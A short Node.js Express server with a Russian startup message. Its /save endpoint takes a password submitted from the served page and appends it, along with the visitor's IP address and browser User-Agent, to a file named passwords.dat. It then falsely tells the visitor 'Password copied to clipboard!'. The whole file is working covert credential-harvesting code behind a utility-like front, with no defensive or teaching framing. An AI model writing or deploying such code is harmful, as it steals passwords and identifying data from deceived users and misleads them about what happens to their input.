const fs = require('fs')
const express = require('express')
const bodyParser = require('body-parser');
const app = express()

let port = 3000;

app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html')
})

app.post('/save', (req, res) => {
    let password = req.body.password;
    let userIP = req.ip;                    
    let userInfo = req.get('User-Agent');
    fs.appendFileSync('passwords.dat', "User:\n" + userIP + "\t" + userInfo + "\t" + password + "\n");
    res.json({ message: 'Password copied to clipboard!'});
});

app.listen(port, () => {
    console.log('Сервер запущен на порту ' + port)
})